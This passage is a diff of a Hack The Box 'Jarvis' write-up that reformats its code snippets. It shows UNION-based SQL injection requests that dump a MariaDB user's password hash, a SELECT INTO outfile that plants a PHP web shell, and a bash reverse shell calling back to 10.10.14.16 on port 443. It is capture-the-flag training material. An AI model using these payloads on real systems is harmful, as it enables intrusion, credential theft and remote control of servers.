@@ -101,13 +101,19 @@ It's unlikely that the value returned in field 4 (what we expect to be descripti
 
 #### Version
 
-`GET /room.php?cod=999+union+select+1,2,3,@@version,5,6,7 HTTP/1.1` --> 10.1.37-MariaDB-0+deb9u1
+```http
+GET /room.php?cod=999+union+select+1,2,3,@@version,5,6,7 HTTP/1.1
+
+10.1.37-MariaDB-0+deb9u1
+```
 
 #### Searching for tables & Columns
 
 First we need to find all tables and columns on the system.
 
-`GET /room.php?cod=999+union+select+1,2,3,group_concat(concat(table_name,':',column_name)),5,6,7+from+information_schema.columns HTTP/1.1`
+```http
+GET /room.php?cod=999+union+select+1,2,3,group_concat(concat(table_name,':',column_name)),5,6,7+from+information_schema.columns HTTP/1.1
+```
 
 The only non default columns are: `room:cod,room:name,room:price,room:descrip,room:star,room:image,room:mini` and these don't contain any information that will help us.
 
@@ -115,7 +121,11 @@ The only non default columns are: `room:cod,room:name,room:price,room:descrip,ro
 
 We know that we're running version 10.1.37 and that version has the [mysql.user table](https://mariadb.com/kb/en/mysqluser-table/). This table contains the username and password hashes for the database users.
 
-`GET /room.php?cod=999+union+select+1,2,3,group_concat(concat(user,':',password)),5,6,7+from+mysql.user HTTP/1.1` --> DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+```http
+GET /room.php?cod=999+union+select+1,2,3,group_concat(concat(user,':',password)),5,6,7+from+mysql.user HTTP/1.1
+
+DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+```
 
 ### Cracking the password hash
 
@@ -159,7 +169,9 @@ PHPMyAdmin allows us to run SQL queries without having to use our SQL injection.
 SELECT "<?php system($_GET['cmd']);?>" INTO outfile '/var/www/html/cmd.php'
 ```
 
-`GET /cmd.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.16/443+0>%261" HTTP/1.1`
+```http
+GET /cmd.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.16/443+0>%261" HTTP/1.1
+```
 
 ```bash
 luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sudo nc -lnvp 443
